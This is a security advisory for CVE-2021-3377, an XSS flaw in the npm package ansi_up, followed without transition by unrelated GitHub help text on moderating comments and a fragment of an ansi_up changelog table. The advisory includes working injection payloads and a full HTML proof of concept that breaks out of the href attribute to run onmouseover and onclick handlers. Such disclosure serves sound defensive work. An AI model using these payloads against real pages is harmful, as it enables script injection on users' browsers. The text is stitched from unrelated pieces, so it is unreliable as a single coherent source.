CVE-2021-3377

Ben Caller of Doyensec

The npm package ansi_up converts ANSI escape codes (used by terminal emulators to,
for  example,  set  text  color)  into  HTML.  Since  ansi_up  v4,  ANSI  escape  codes  can  be
used  to  create  HTML  hyperlinks.  Due  to  insufﬁcient  URL  sanitization,  extra  HTML
attributes and javascript code can be injected into the returned HTML. This can be used
in a Cross-Site Scripting (XSS) attack.

Technical Description

The OSC Hyperlink feature takes ANSI text of the form:

\u001B]8;;https://doyensec.com\u0007Doyensec\u001B]8;;\u0007

and returns HTML of the form:

<a href="https://doyensec.com">Doyensec</a>

The HTML is produced in the process_hyperlink function  with:

1

let result = `<a href="${this.escape_txt_for_html(pkt.url)}">$

{this.escape_txt_for_html(pkt.text)}</a>`;

             WWW.DOYENSEC.COM

Security Advisory

The  '<',  '>'  and  '&'  are  sanitized  by  escape_txt_for_html.  The  URL  also  cannot  contain
spaces.  However,  the  double  quote  character  can  be  used  to  break  out  of  the  href
attribute.
Other attributes such as the event handler  onmouseover and the  style attribute can be
set.

Spaces do not need to be used between HTML attributes as the forward slash character
can be used instead.

Reproduction Steps

When processed by ansi_up, the input:

\u001B]8;;https://doyensec.com"/onmouseover="alert(1)\u0007Doyensec\u001B]8;;\u0007

produces the following HTML:

<a href="https://doyensec.com"/onmouseover="alert(1)">Doyensec</a>

This  will  execute  javascript  (pop  open  an  alert  box)  when  the  mouse  moves  over  the
link.

A full html example:

<div id="console"></div>

<script src="https://cdn.jsdelivr.net/npm/ansi_up@4.0.4/ansi_up.min.js"></

script>

<script>

var logOutput = `\x1b]8;;https://"/onclick="alert(1)"/onmouseover="alert(1)"/

onfocus="alert(1)""/onblur="alert(1)"/

style="position:fixed;width:60%;height:60%;transform:rotateZ(45deg);top:20%;l

eft:20%;background:url('https://blog.doyensec.com/public/images/

logo.png');background-position:center;background-size:cover;padding-

top:75px;font-size:xxx-large;color:red;text-decoration:underline;text-

align:center"/tabindex="1\x07XSS\x1b]8;;\x07`;

var html = (new AnsiUp).ansi_to_html(logOutput);

document.getElementById("console").innerHTML = html;

</script>

# Managing disruptive comments

You can hide, edit, or delete comments on issues, pull requests, and commits.

## [Hiding a comment](#hiding-a-comment)

Organization moderators, and anyone with write access to a repository, can hide comments on issues, pull requests, and commits.

If a comment is off-topic, outdated, or resolved, you may want to hide a comment to keep a discussion focused or make a pull request easier to navigate and review. Hidden comments are minimized but people with read access to the repository can expand them.

![Screenshot of a hidden comment. The only visible content is "This comment has been minimized", with a button to show the comment.](/assets/cb-13766/images/help/repository/hidden-comment.png)

1. Navigate to the comment you'd like to hide.
2. In the upper-right corner of the comment, click , then click **Hide**.

   ![Screenshot of a pull request comment by octo-user. Below an icon of three horizontal dots, a dropdown menu is expanded, and "Hide" is outlined in orange.](/assets/cb-42438/images/help/repository/comment-menu-hide.png)
3. Using the "Choose a reason" dropdown menu, choose a reason to hide the comment. Then select **Hide comment**.

   ![Screenshot of a GitHub comment showing a menu to select a reason to hide the comment: Spam, Abuse, Off Topic, Outdated, Duplicate, or Resolved.](/assets/cb-67538/images/help/repository/choose-reason-for-hiding-comment.png)

## [Unhiding a comment](#unhiding-a-comment)

Organization moderators, and anyone with write access to a repository, can unhide comments on issues, pull requests, and commits.

1. Navigate to the comment you'd like to unhide.
2. On the right side of the comment, click  **Show comment**.
3. On the right side of the expanded comment, select the  dropdown menu, then click **Unhide**.

   ![Screenshot of a pull request comment marked as spam. Below an icon of three horizontal dots, a dropdown menu is expanded, and "Unhide" is outlined in orange.](/assets/cb-50118/images/help/repository/comment-menu-hidden.png)

## [Editing a comment](#editing-a-comment)

Anyone with write access to a repository can edit comments on issues, pull requests, and commits.

It's appropriate to edit a comment and remove content that doesn't contribute to the conversation and violates your community's code of conduct or GitHub's [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

Sometimes it may make sense to clearly indicate edits and their justification.

That said, anyone with read access to a repository can view a comment's edit history. The **edited** dropdown at the top of the comment contains a history of edits showing the user and timestamp for each edit.

![Screenshot of a comment by octo-user, which has been partially redacted. In the comment header, next to the text "edited by octocat", a dropdown icon is outlined in orange.](/assets/cb-42069/images/help/repository/content-redacted-comment.png)

## [Redacting sensitive information](#redacting-sensitive-information)

Comment authors and anyone with write access to a repository can also delete sensitive information from a comment's edit history. For more information, see [Tracking changes in a comment](/en/communities/moderating-comments-and-conversations/tracking-changes-in-a-comment).

1. Navigate to the comment you'd like to edit.
2. In the upper-right corner of the comment, click , then click **Edit**.

   ![Screenshot of a pull request comment by octo-user. Below an icon of three horizontal dots, a dropdown menu is expanded, and "Edit" is outlined in orange.](/assets/cb-42473/images/help/repository/comment-menu-edit.png)
3. In the comment window, delete the content you'd like to remove, then type `[REDACTED]` to replace it.
4. At the bottom of the comment, type a note indicating that you have edited the comment, and optionally, why you edited the comment.
5. Click **Update comment**.

## [Deleting a comment](#deleting-a-comment)

Anyone with write access to a repository can delete comments on issues, pull requests, and commits. Organization owners, team maintainers, and the comment author can also delete a comment on a team page.

If a comment contains some constructive content that adds to the conversation in the issue or pull request, you can edit the comment instead.

Deleting a comment is your last resort as a moderator. It's appropriate to delete a comment if the entire comment adds no constructive content to a conversation and violates your community's code of conduct or GitHub's [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

Deleting a comment creates a timeline event that is visible to anyone with read access to the repository. However, the username of the person who deleted the comment is only visible to people with write access to the repository. For anyone without write access, the timeline event is anonymized.

![Screenshot of a timeline event, which says "octo-org deleted a comment from hubot 6 minutes ago."](/assets/cb-10760/images/help/issues/anonymized-timeline-entry-for-deleted-comment.png)

Note

The initial comment (or body) of an issue or pull request can't be deleted. Instead, you can edit issue and pull request bodies to remove unwanted content.

### [Steps to delete a comment](#steps-to-delete-a-comment)

1. Navigate to the comment you'd like to delete.
2. In the upper-right corner of the comment, click , then click **Delete**.
   ![Screenshot of a pull request comment by octo-user. Below an icon of three horizontal dots, a dropdown menu is expanded, and "Delete" is outlined in orange.](/assets/cb-42453/images/help/repository/comment-menu-delete.png)
3. Optionally, write a comment noting that you deleted a comment and why.

```
If you had a malformed URL when using the OSC URL sequence,
it would not be properly escaped.
Also, html escaping is now mandatory, so the API changed.
The 'escape_for_html' property was removed.

|  |  | ## Buffering |
|  |  |  |
|  |  | In general, the ansi\_to\_html \*should\* emit HTML when invoked with a non-empty string. |
|  |  | The only exceptions are an incomplete ESC sequence or an incomplete escaped URL. |
|  |  | For those cases, the library will buffer the escape or the sequence for the escaped URL. |
|  |  |  |
|  |  | The library is also stateful. If a color is set in a prior invocation, then it will |
|  |  | continue to emit that color in further invocations until the color/SGR attribute is changed. |
|  |  | In general, the ansi\_to\_html \*should\* emit HTML output when invoked with a non-empty string. |
|  |  | The only exceptions are an incomplete ESC sequence or an incomplete OSC URL sequence. |
|  |  | For those cases, the library will buffer (not emit output), until it receives input that completes those sequences. |
